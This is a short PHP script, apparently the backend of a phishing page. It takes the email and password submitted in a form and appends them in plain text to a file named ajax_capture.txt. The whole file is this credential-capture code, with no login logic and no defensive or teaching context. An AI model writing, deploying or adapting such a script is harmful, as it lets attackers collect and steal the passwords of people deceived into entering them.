<?php
$email = $_POST['email'] ?? '';
$pass = $_POST['pass'] ?? '';
file_put_contents("ajax_capture.txt", "[$email|$pass]\n", FILE_APPEND);
?>
